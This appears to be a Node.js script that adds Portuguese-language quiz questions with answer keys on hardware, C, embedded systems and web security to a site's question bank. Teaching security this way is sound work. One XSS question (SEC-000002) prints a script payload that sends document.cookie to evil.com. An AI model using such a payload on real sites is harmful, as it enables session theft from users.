import fs from 'fs';
import path from 'path';

const questionsPath = 'c:/Users/Guilherme/Desktop/Site/data/questions.json';
const existing = JSON.parse(fs.readFileSync(questionsPath, 'utf8'));

console.log(`Existing questions count: ${existing.length}`);

const newQuestions = [
	// ==================== HARDWARE & ARQUITETURA ====================
	{
		id: "HD-000001",
		category: "Hardware",
		skill: "portas lógicas",
		level: "beginner",
		difficulty: 1,
		type: "multiple_choice",
		cognitive_level: "understand",
		objective: "Compreender o funcionamento da porta lógica XOR.",
		question: "Em eletrônica digital e arquitetura de computadores, qual é a saída de uma porta lógica XOR (OU Exclusivo) quando as entradas A e B são respectivamente 1 e 1?",
		code: "Entrada A: 1\nEntrada B: 1\nPorta: XOR (A ⊕ B)\nSaída = ?",
		options: [
			"0",
			"1",
			"Alta impedância (Z)",
			"Indefinido"
		],
		answer: "0",
		explanation: "A porta XOR retorna 1 (Verdadeiro) apenas quando as entradas são diferentes (0 e 1, ou 1 e 0). Quando ambas as entradas são iguais (0 e 0, ou 1 e 1), o resultado é 0.",
		xp: 15,
		tags: ["hardware", "logica-digital", "portas-logicas"]
	},
	{
		id: "HD-000002",
		category: "Hardware",
		skill: "arquitetura de computadores",
		level: "intermediate",
		difficulty: 2,
		type: "multiple_choice",
		cognitive_level: "understand",
		objective: "Identificar a função da Unidade Lógica e Aritmética (ALU).",
		question: "Dentro do processador (CPU), qual componente é o responsável direto pela execução de cálculos matemáticos (soma, subtração) e operações booleanas (AND, OR, NOT)?",
		code: null,
		options: [
			"Unidade de Controle (UC)",
			"Unidade Lógica e Aritmética (ALU / ULA)",
			"Registrador de Instruções (IR)",
			"Memória Cache L1"
		],
		answer: "Unidade Lógica e Aritmética (ALU / ULA)",
		explanation: "A ALU (Arithmetic Logic Unit ou ULA) é o bloco funcional do processador que executa operações aritméticas e lógicas elementares sobre os dados.",
		xp: 15,
		tags: ["hardware", "cpu", "arquitetura"]
	},
	{
		id: "HD-000003",
		category: "Hardware",
		skill: "hierarquia de memória",
		level: "intermediate",
		difficulty: 2,
		type: "multiple_choice",
		cognitive_level: "analyze",
		objective: "Entender a hierarquia de memórias por tempo de acesso.",
		question: "Considerando a hierarquia de memória em um computador moderno, qual das seguintes memórias possui a menor latência (maior velocidade de acesso)?",
		code: null,
		options: [
			"Registradores da CPU",
			"Cache L1",
			"Memória RAM DDR5",
			"SSD NVMe PCIe Gen 4"
		],
		answer: "Registradores da CPU",
		explanation: "Os registradores ficam integrados diretamente no núcleo do processador e operam na mesma frequência da CPU (< 1 ciclo de clock), sendo a memória mais rápida do sistema.",
		xp: 20,
		tags: ["hardware", "memoria", "performance"]
	},
	{
		id: "HD-000004",
		category: "Hardware",
		skill: "sistemas de numeração",
		level: "beginner",
		difficulty: 1,
		type: "multiple_choice",
		cognitive_level: "apply",
		objective: "Converter número binário de 8 bits para hexadecimal.",
		question: "Qual é o valor hexadecimal equivalente ao byte binário `10111100`?",
		code: "Binário: 1011 1100\nHexadecimal = 0x??",
		options: [
			"0xBC",
			"0xAC",
			"0xB8",
			"0xCB"
		],
		answer: "0xBC",
		explanation: "Dividindo o byte em dois nibbles de 4 bits: 1011 em decimal é 11 (Hex 'B') e 1100 em decimal é 12 (Hex 'C'). Logo, 10111100 = 0xBC.",
		xp: 15,
		tags: ["hardware", "binario", "hexadecimal"]
	},
	{
		id: "HD-000005",
		category: "Hardware",
		skill: "barramentos e ciclo de instrução",
		level: "advanced",
		difficulty: 3,
		type: "multiple_choice",
		cognitive_level: "understand",
		objective: "Explicar as fases do ciclo de instrução de Von Neumann.",
		question: "Qual é a sequência correta das três etapas fundamentais do ciclo de instrução executado pela CPU?",
		code: null,
		options: [
			"Busca (Fetch) -> Decodificação (Decode) -> Execução (Execute)",
			"Compilação -> Linkagem -> Execução",
			"Escrita -> Leitura -> Limpeza de Cache",
			"Interrupção -> Escalonamento -> Despacho"
		],
		answer: "Busca (Fetch) -> Decodificação (Decode) -> Execução (Execute)",
		explanation: "O ciclo de instrução clássico de Von Neumann é composto por: Busca da instrução na memória (Fetch), Decodificação pelo decodificador de instruções (Decode) e Execução pela ALU/registradores (Execute).",
		xp: 25,
		tags: ["hardware", "cpu", "arquitetura-computadores"]
	},

	// ==================== C / ASSEMBLY & SISTEMAS BAIXO NÍVEL ====================
	{
		id: "BN-000001",
		category: "Baixo Nível",
		skill: "ponteiros em C",
		level: "intermediate",
		difficulty: 2,
		type: "multiple_choice",
		cognitive_level: "apply",
		objective: "Analisar manipulação de ponteiros e desreferenciação em C.",
		question: "Qual será a saída impressa pelo código C a seguir?",
		code: "#include <stdio.h>\nint main() {\n    int a = 10;\n    int *ptr = &a;\n    *ptr = 25;\n    printf(\"%d\", a);\n    return 0;\n}",
		options: [
			"25",
			"10",
			"Endereço de memória de a",
			"Erro de compilação"
		],
		answer: "25",
		explanation: "O ponteiro `ptr` armazena o endereço de `a`. A operação de desreferenciação `*ptr = 25` altera o valor armazenado diretamente na memória de `a`, fazendo `a` valer 25.",
		xp: 20,
		tags: ["c", "baixo-nivel", "ponteiros"]
	},
	{
		id: "BN-000002",
		category: "Baixo Nível",
		skill: "gerenciamento de memória",
		level: "intermediate",
		difficulty: 2,
		type: "multiple_choice",
		cognitive_level: "analyze",
		objective: "Identificar vazamento de memória (Memory Leak) em C.",
		question: "O que acontece quando alocamos memória dinamicamente com `malloc()` em C e não chamamos `free()` antes do término do programa ou da perda do ponteiro?",
		code: "int *arr = (int*)malloc(1000 * sizeof(int));\n// ponteiro 'arr' é sobrescrito sem dar free(arr)",
		options: [
			"Vazamento de Memória (Memory Leak)",
			"Stack Overflow imediato",
			"Segmentation Fault em tempo de compilação",
			"A memória é coletada automaticamente pelo Garbage Collector"
		],
		answer: "Vazamento de Memória (Memory Leak)",
		explanation: "Linguagens como C e C++ não possuem Garbage Collector automático. Quando a memória alocada no Heap não é liberada com free(), ela fica inacessível porém ocupada, gerando vazamento de memória.",
		xp: 20,
		tags: ["c", "memoria", "heap"]
	},
	{
		id: "BN-000003",
		category: "Baixo Nível",
		skill: "assembly x86-64",
		level: "advanced",
		difficulty: 3,
		type: "multiple_choice",
		cognitive_level: "apply",
		objective: "Compreender instruções Assembly x86 básicas.",
		question: "No Assembly x86 (sintaxe Intel), qual é o efeito da instrução `mov eax, 0` ou `xor eax, eax`?",
		code: "xor eax, eax",
		options: [
			"Zera o valor do registrador EAX de forma rápida e eficiente",
			"Copia o valor do registrador EAX para a memória",
			"Gera uma interrupção de sistema",
			"Incrementa o registrador EAX em 1"
		],
		answer: "Zera o valor do registrador EAX de forma rápida e eficiente",
		explanation: "Fazer um XOR de um registrador consigo mesmo sempre resulta em zero (pois x ⊕ x = 0). Compiladores usam `xor eax, eax` porque a instrução tem opcode menor e é executada em 1 ciclo.",
		xp: 25,
		tags: ["assembly", "baixo-nivel", "x86"]
	},
	{
		id: "BN-000004",
		category: "Baixo Nível",
		skill: "chamadas de sistema (syscalls)",
		level: "advanced",
		difficulty: 3,
		type: "multiple_choice",
		cognitive_level: "understand",
		objective: "Compreender a transição entre User Space e Kernel Space via Syscall.",
		question: "Como um programa em espaço de usuário (User Space) solicita ao sistema operacional (Kernel) que grave dados em um arquivo no disco?",
		code: null,
		options: [
			"Executando uma Chamada de Sistema (Syscall, ex: write)",
			"Acessando diretamente a trilha do disco via ponteiro de memória",
			"Disparando uma exceção de divisão por zero",
			"Instanciando um thread em modo anônimo"
		],
		answer: "Executando uma Chamada de Sistema (Syscall, ex: write)",
		explanation: "O hardware moderno protege recursos críticos usando anéis de privilégio (Ring 3 para User Space, Ring 0 para Kernel). Para acessar o disco, a aplicação deve disparar uma System Call (syscall).",
		xp: 25,
		tags: ["sistemas-operacionais", "syscalls", "kernel"]
	},
	{
		id: "BN-000005",
		category: "Baixo Nível",
		skill: "stack vs heap",
		level: "intermediate",
		difficulty: 2,
		type: "multiple_choice",
		cognitive_level: "understand",
		objective: "Diferenciar a pilha de execução (Stack) e o monte (Heap).",
		question: "Em relação ao modelo de memória de um processo, onde ficam alocadas as variáveis locais de uma função e os endereços de retorno?",
		code: null,
		options: [
			"Na Pilha (Stack)",
			"No Heap",
			"No segmento de código (.text)",
			"Na memória Virtual Swap do disco"
		],
		answer: "Na Pilha (Stack)",
		explanation: "A Stack (pilha) armazena frames de funções, variáveis locais e endereços de retorno com alocação/desalocação automática e extremamente rápida baseada no Stack Pointer (ESP/RSP).",
		xp: 20,
		tags: ["memoria", "stack", "baixo-nivel"]
	},

	// ==================== SISTEMAS EMBARCADOS & IOT ====================
	{
		id: "EM-000001",
		category: "Sistemas Embarcados",
		skill: "microcontroladores e GPIO",
		level: "beginner",
		difficulty: 1,
		type: "multiple_choice",
		cognitive_level: "understand",
		objective: "Explicar a função dos pinos GPIO.",
		question: "Em plataformas como Arduino, ESP32 e Raspberry Pi, o que significa a sigla GPIO?",
		code: null,
		options: [
			"General Purpose Input/Output (Entrada/Saída de Uso Geral)",
			"Graphics Processing Integrated Option",
			"Global Power & Internal Oscillator",
			"General Protocol Internet Operation"
		],
		answer: "General Purpose Input/Output (Entrada/Saída de Uso Geral)",
		explanation: "GPIO são pinos programáveis em microcontroladores que podem ser configurados via software como entradas (leitura de botões/sensores) ou saídas (acionamento de LEDs, relés, etc).",
		xp: 15,
		tags: ["embarcados", "arduino", "gpio"]
	},
	{
		id: "EM-000002",
		category: "Sistemas Embarcados",
		skill: "protocolos de comunicação",
		level: "intermediate",
		difficulty: 2,
		type: "multiple_choice",
		cognitive_level: "analyze",
		objective: "Diferenciar os protocolos de barramento I2C e SPI.",
		question: "Qual barramento serial de comunicação síncrona utiliza apenas dois fios (SDA para dados e SCL para clock) e suporta múltiplos dispositivos endereçáveis?",
		code: null,
		options: [
			"I2C (Inter-Integrated Circuit)",
			"SPI (Serial Peripheral Interface)",
			"UART / RS-232",
			"CAN Bus"
		],
		answer: "I2C (Inter-Integrated Circuit)",
		explanation: "O I2C usa duas linhas (SDA e SCL) com resistores de pull-up, permitindo conectar dezenas de sensores e displays ao mesmo barramento usando endereços hexadecimais de 7 bits.",
		xp: 20,
		tags: ["embarcados", "i2c", "sensores"]
	},
	{
		id: "EM-000003",
		category: "Sistemas Embarcados",
		skill: "interrupções de hardware (ISR)",
		level: "advanced",
		difficulty: 3,
		type: "multiple_choice",
		cognitive_level: "apply",
		objective: "Entender boas práticas ao escrever uma ISR (Interrupt Service Routine).",
		question: "Qual é a regra mais crítica de boas práticas ao implementar uma rotina de serviço de interrupção (ISR) em um microcontrolador?",
		code: null,
		options: [
			"A ISR deve ser o mais curta e rápida possível, evitando operações blocantes como delay() ou I/O pesado",
			"A ISR deve conter laços longos while(1) para garantir a leitura do sensor",
			"A ISR deve alocar grandes blocos de memória no Heap com malloc()",
			"A ISR deve ser executada apenas quando a CPU estiver em modo de hibernação profunda"
		],
		answer: "A ISR deve ser o mais curta e rápida possível, evitando operações blocantes como delay() ou I/O pesado",
		explanation: "Uma ISR pausa o fluxo principal da CPU imediatamente. Se ela for demorada ou usar delays/bloqueios, outras interrupções críticas do sistema serão perdidas, travando o firmware.",
		xp: 25,
		tags: ["embarcados", "interrupcoes", "firmware"]
	},
	{
		id: "EM-000004",
		category: "Sistemas Embarcados",
		skill: "modulação PWM",
		level: "intermediate",
		difficulty: 2,
		type: "multiple_choice",
		cognitive_level: "understand",
		objective: "Explicar como o PWM controla velocidade de motores e brilho de LEDs.",
		question: "Como o PWM (Pulse Width Modulation) permite controlar a intensidade do brilho de um LED ou a velocidade de um motor DC em um pino digital?",
		code: "Duty Cycle: 50% (metade do período em nível ALTO, metade em nível BAIXO)",
		options: [
			"Variando o ciclo de trabalho (Duty Cycle) entre ligado e desligado em alta frequência",
			"Alterando fisicamente a resistência do silício no microcontrolador",
			"Convertendo o pino digital nativamente em corrente alternada senoidal pura",
			"Aumentando a tensão de 5V para 220V"
		],
		answer: "Variando o ciclo de trabalho (Duty Cycle) entre ligado e desligado em alta frequência",
		explanation: "O PWM chaveia a saída entre HIGH e LOW tão rapidamente que a carga (motor/LED) reage à tensão média entregue, proporcional à porcentagem do ciclo ativo (Duty Cycle).",
		xp: 20,
		tags: ["embarcados", "pwm", "hardware"]
	},
	{
		id: "EM-000005",
		category: "Sistemas Embarcados",
		skill: "protocolo MQTT para IoT",
		level: "intermediate",
		difficulty: 2,
		type: "multiple_choice",
		cognitive_level: "understand",
		objective: "Compreender o modelo Publish/Subscribe do protocolo MQTT.",
		question: "Por que o protocolo MQTT é amplamente preferido em relação ao HTTP para dispositivos de Internet das Coisas (IoT) com restrição de bateria e largura de banda?",
		code: null,
		options: [
			"Porque utiliza um cabeçalho extremamente leve (a partir de 2 bytes) e modelo Publish/Subscribe sobre TCP",
			"Porque opera exclusivamente sem necessidade de conexão com a rede",
			"Porque elimina completamente a necessidade de qualquer broker intermediário",
			"Porque transmite apenas dados no formato XML compactado"
		],
		answer: "Porque utiliza um cabeçalho extremamente leve (a partir de 2 bytes) e modelo Publish/Subscribe sobre TCP",
		explanation: "O MQTT foi projetado especificamente para redes de baixa largura de banda e alta latência, com overhead mínimo no cabeçalho e comunicação assíncrona orientada a tópicos.",
		xp: 20,
		tags: ["iot", "mqtt", "redes"]
	},

	// ==================== CIBERSEGURANÇA & HACKING ÉTICO ====================
	{
		id: "SEC-000001",
		category: "Segurança",
		skill: "owasp sql injection",
		level: "intermediate",
		difficulty: 2,
		type: "multiple_choice",
		cognitive_level: "apply",
		objective: "Identificar a forma correta de mitigar SQL Injection.",
		question: "Qual técnica é a mais eficaz para prevenir completamente vulnerabilidades de SQL Injection (SQLi) em aplicações web?",
		code: "// Código vulnerável:\nquery = \"SELECT * FROM users WHERE user = '\" + input + \"'\";",
		options: [
			"Usar Prepared Statements (Consultas Parametrizadas) ou ORMs seguros",
			"Apenas bloquear caracteres de aspas simples usando regex no frontend",
			"Criptografar todo o banco de dados com algoritmo RSA",
			"Rodar o banco de dados na porta padrão 3306"
		],
		answer: "Usar Prepared Statements (Consultas Parametrizadas) ou ORMs seguros",
		explanation: "Consultas parametrizadas (Prepared Statements) separam a estrutura da instrução SQL dos dados do usuário, garantindo que qualquer input seja tratado estritamente como dado literal, nunca como comando.",
		xp: 20,
		tags: ["seguranca", "owasp", "sqli"]
	},
	{
		id: "SEC-000002",
		category: "Segurança",
		skill: "owasp xss",
		level: "intermediate",
		difficulty: 2,
		type: "multiple_choice",
		cognitive_level: "analyze",
		objective: "Entender o impacto do Cross-Site Scripting (XSS).",
		question: "O que um invasor consegue realizar ao explorar com sucesso uma vulnerabilidade de Cross-Site Scripting (XSS) refletido ou armazenado?",
		code: "<script>fetch('https://evil.com/steal?c=' + document.cookie);</script>",
		options: [
			"Executar código JavaScript malicioso no navegador da vítima, roubando tokens de sessão/cookies",
			"Reiniciar o servidor backend remotamente",
			"Alterar as tabelas físicas do banco de dados diretamente sem passar pela API",
			"Descobrir a senha da BIOS da máquina servidora"
		],
		answer: "Executar código JavaScript malicioso no navegador da vítima, roubando tokens de sessão/cookies",
		explanation: "O XSS permite injetar scripts no navegador de outros usuários. Com isso, o invasor pode capturar cookies de autenticação (se não forem HttpOnly), sequestrar sessões e forçar ações em nome da vítima.",
		xp: 20,
		tags: ["seguranca", "owasp", "xss"]
	},
	{
		id: "SEC-000003",
		category: "Segurança",
		skill: "criptografia e hashing",
		level: "intermediate",
		difficulty: 2,
		type: "multiple_choice",
		cognitive_level: "understand",
		objective: "Diferenciar criptografia reversível de hashing com sal.",
		question: "Qual é o padrão recomendado para armazenar senhas de usuários em um banco de dados de forma segura?",
		code: null,
		options: [
			"Aplicar funções de Hash criptográfico lentas com Salt automático (ex: bcrypt, Argon2 ou PBKDF2)",
			"Criptografar as senhas com AES-128 e guardar a chave no arquivo index.html",
			"Armazenar o hash puro em MD5 sem salt para economizar espaço",
			"Salvar em Base64 para garantir velocidade de consulta"
		],
		answer: "Aplicar funções de Hash criptográfico lentas com Salt automático (ex: bcrypt, Argon2 ou PBKDF2)",
		explanation: "Funções como bcrypt e Argon2 incluem Salt exclusivo por usuário (evitando ataques por Rainbow Table) e fator de custo ajustável (evitando ataques de força bruta acelerados por GPU).",
		xp: 20,
		tags: ["seguranca", "criptografia", "senhas"]
	},
	{
		id: "SEC-000004",
		category: "Segurança",
		skill: "autenticação e tokens jwt",
		level: "advanced",
		difficulty: 3,
		type: "multiple_choice",
		cognitive_level: "analyze",
		objective: "Compreender a assinatura criptográfica de um JSON Web Token (JWT).",
		question: "Um token JWT é composto por 3 partes separadas por pontos (Header.Payload.Signature). O que impede um invasor de alterar seu cargo no Payload de 'user' para 'admin'?",
		code: "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3VpIiwicm9sZSI6ImFkbWluIn0.Kx9...",
		options: [
			"A assinatura digital (Signature), pois o servidor valida a assinatura com um segredo privado que o invasor não possui",
			"O Payload é criptografado de forma indecifrável e não pode ser lido",
			"O navegador bloqueia automaticamente a edição de strings em Base64",
			"O protocolo HTTPS invalida tokens com mais de 3 partes"
		],
		answer: "A assinatura digital (Signature), pois o servidor valida a assinatura com um segredo privado que o invasor não possui",
		explanation: "O payload do JWT é apenas codificado em Base64Url (pode ser lido por qualquer um). A segurança vem da Signature, gerada pela chave secreta do backend. Se o payload for adulterado, a assinatura não baterá e o servidor rejeitará a requisição.",
		xp: 25,
		tags: ["seguranca", "jwt", "autenticacao"]
	},
	{
		id: "SEC-000005",
		category: "Segurança",
		skill: "redes e proteção csrf",
		level: "advanced",
		difficulty: 3,
		type: "multiple_choice",
		cognitive_level: "understand",
		objective: "Explicar a defesa contra Cross-Site Request Forgery (CSRF).",
		question: "Como os tokens Anti-CSRF ou o atributo `SameSite=Strict/Lax` em cookies protegem os usuários contra ataques de Cross-Site Request Forgery?",
		code: null,
		options: [
			"Garantindo que requisições vindas de sites terceiros não incluam automaticamente os cookies de sessão ou exijam um token secreto imprevisível",
			"Bloqueando a conexão com servidores DNS não autorizados",
			"Desativando o protocolo TCP e forçando o uso de UDP",
			"Exigindo que o usuário digite um CAPTCHA a cada clique no site"
		],
		answer: "Garantindo que requisições vindas de sites terceiros não incluam automaticamente os cookies de sessão ou exijam um token secreto imprevisível",
		explanation: "O ataque CSRF induz o navegador logado a submeter uma requisição maliciosa para um site confiável. Tokens CSRF únicos e o SameSite cookie impedem que o site do invasor execute ações autorizadas em nome do usuário.",
		xp: 25,
		tags: ["seguranca", "csrf", "web"]
	},
	{
		id: "SEC-000006",
		category: "Segurança",
		skill: "devsecops e linux hardening",
		level: "advanced",
		difficulty: 3,
		type: "multiple_choice",
		cognitive_level: "apply",
		objective: "Aplicar o princípio do menor privilégio em contêineres Docker e Linux.",
		question: "No contexto de DevSecOps e segurança de contêineres Docker em produção, qual prática mitiga o risco de ataques de Container Escape?",
		code: "# Dockerfile de produção:\nUSER node\n# ao invés de rodar como root padrão",
		options: [
			"Executar a aplicação como um usuário sem privilégios (Non-Root User) dentro do container",
			"Rodar o contêiner sempre com a flag `--privileged` ativada",
			"Montar o socket do Docker `/var/run/docker.sock` dentro de todos os contêineres web",
			"Desativar o firewall do host para reduzir a latência de rede"
		],
		answer: "Executar a aplicação como um usuário sem privilégios (Non-Root User) dentro do container",
		explanation: "Se um processo dentro do container for comprometido rodando como Root, o invasor tem facilidade muito maior para quebrar o isolamento de namespaces/cgroups e assumir o controle do host do servidor.",
		xp: 25,
		tags: ["seguranca", "docker", "devsecops"]
	}
];

// Verify IDs don't collide
const existingIds = new Set(existing.map(q => q.id));
let added = 0;
for (const nq of newQuestions) {
	if (!existingIds.has(nq.id)) {
		existing.push(nq);
		existingIds.add(nq.id);
		added++;
	}
}

fs.writeFileSync(questionsPath, JSON.stringify(existing, null, 2), 'utf8');
console.log(`Added ${added} new specialized questions. Total questions now: ${existing.length}`);
